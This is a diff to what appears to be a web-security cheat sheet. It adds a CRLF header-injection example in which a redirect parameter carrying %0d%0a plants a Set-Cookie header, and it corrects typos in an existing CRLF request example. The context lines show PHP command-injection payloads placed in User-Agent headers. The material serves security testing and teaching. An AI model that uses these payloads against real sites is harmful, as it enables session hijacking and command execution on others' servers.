@@ -124,8 +124,17 @@ User-Agent: Mozilla <?php system('bin/ls');?>      // cmd injection #2
 User-Agent: Mozilla <?php passthru('bin/ls');?>    // cmd injection #3 
 ```
 
-[Carriage-Return Line-Feed injection:](#clrf-injection-in-http-header)
+Inject header + CRLF: Set your own cookies example
+```http
+// Request with Carriage-Return Line-Feed '%0d%0a'
+example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20ASPSESSIONID=SessionValue%0d%0a
 
+// Response
+HTTP/1.1 302 Object moved
+Location: account.asp?origin=foo
+Set-Cookie: ASPSESSIONID=SessionValue
+Content-Length: 121
+```
 
 ### ============================================================
 ### Authentication and Session Management
@@ -665,12 +674,12 @@ http://0x7f.1/
 http://127.000.000.1
 ```
 
-CLRF injection in HTTP header
+CRLF injection in HTTP header
 ```
 Carriage Return (\r) or Line Feed (\n) terminates a line of HTTP request.
 
 // Attacker's request:
-GET ?url=http://example.com/%0d%0aRefeerer:localhost
+GET ?url=http://example.com/%0d%0aReferer:localhost
 Host:www.target.com
 
 // Server's request
